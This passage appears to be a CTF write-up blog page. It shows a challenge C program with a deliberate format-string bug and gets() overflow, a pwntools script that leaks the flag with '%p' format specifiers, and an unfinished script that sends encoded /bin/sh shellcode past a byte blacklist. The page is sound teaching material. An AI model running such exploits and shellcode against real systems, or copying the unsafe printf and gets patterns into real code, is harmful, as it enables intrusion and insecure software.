+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; | |__  | | __ _  __ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  / /_ _ _   _| | |_ </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; |  __| | |/ _` |/ _` </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/ / _` | | | | | __|</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; | |    | | (_| | (_| |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  / (_| | |_| | | |_ </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34; |_|    |_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__,_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__, | </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__,_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__,_|_|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">__|</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;                  __/ |                      </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;                 |___/                       </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;                                             </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;==================================================================</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	      );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>username){
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">200</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(flag, <span style="color:#ae81ff">199</span>, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//printf(&#34;%s&#34;, flag);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//The user needs to be mocked for thinking they could retrieve the flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello, &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(username);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;. Was version 2.0 too simple for you? Well I don&#39;t see no flags being shown now xD xD xD...</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Yours truly,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ByteReaper</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> username[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Username: &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(username);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// The flag isn&#39;t printed anymore. No need for authentication
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">print_flag</span>(username);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stderr, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Start login process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">print_banner</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">login</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In this new version, the program doesn&rsquo;t retrieve password anymore because the flag isn&rsquo;t printed, but we notice it is still stored in memory, in the stack frame of <code>print_flag</code>. In this function, we can see a bad usage of the <code>printf</code> function where a user supplied input is passed as the <code>fmt</code> argument for the function printf.</p>
+<p>This allows an attacker to provide format strings that would be processed by printf. As many of these formats can be used to display printf arguments (and the actual hasn&rsquo;t any), we can try to leak the stack values in the function.</p>
+<p>Remember that in <code>x86-64</code> arguments are first passed into registers and then into the stack if there is more. This means that if we provide more than 6 <code>%p</code> in input, we should start leaking stack values.</p>
+<p>Now its a matter of testing in order to find the correct printf argument offset to the flag, and then try to leak entirely. I usually use pwntools for such things, but in our case it was simple enough for trying manually. We supply enough <code>%p-</code> into the input, and look at printed values. If we see many printed pointers that holds only ASCII values, we can try to see if its the flag. It could also be determined theorically.</p>
+<p>After trying a bit, I found correct offsets to flag and succeeded to dump it using the format string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;ip&#34;</span>)
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>ip, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;%10$p-%11$p-%12$p&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Hello, &#39;</span>)
+</span></span><span style="display:flex;"><span>flag_encoded <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;-&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parts_decoded <span style="color:#f92672">=</span> [ p64(int(x, <span style="color:#ae81ff">16</span>)) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> flag_encoded ]
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(parts_decoded)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><h2 id="pwn---voidexec">PWN - VoidExec<a href="#pwn---voidexec" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p><strong><em>Work In Progress</em></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>blacklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xCD\x80</span><span style="color:#e6db74">&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;command&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser_local <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;local&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser_local<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;binary&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser_remote <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;remote&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;host&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser_remote<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;port&#39;</span>, type<span style="color:#f92672">=</span>int)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#parser.add_argument(&#39;--libc&#39;, required=True)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#parser.add_argument(&#39;--binary&#39;, required=True)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(args<span style="color:#f92672">.</span>binary)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#binary = ELF(args.binary)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#libc = ELF(args.libc)</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#sc = b&#34;\xF3\x0F\x1E\xFA&#34;</span>
+</span></span><span style="display:flex;"><span>    sc <span style="color:#f92672">=</span> bytes([
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xc3</span>
+</span></span><span style="display:flex;"><span>   ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sc <span style="color:#f92672">=</span> encode(sc, avoid<span style="color:#f92672">=</span>blacklist)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(sc)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> sc[i] <span style="color:#f92672">==</span> blacklist[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">or</span> (sc[i] <span style="color:#f92672">==</span> blacklist[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">and</span> sc[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> blacklist[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>]):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;blacklist char </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> at </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(sc[i], i))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#gdb.attach(p)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#input(&#39;enter to continue&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(sc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/ctf-htb-cyberapocalypse-2025/" class="button inline prev">
+        Ctf Htb Cyberapocalypse 2025
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/pwn-linkern-rop/" class="button inline next">
+        Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
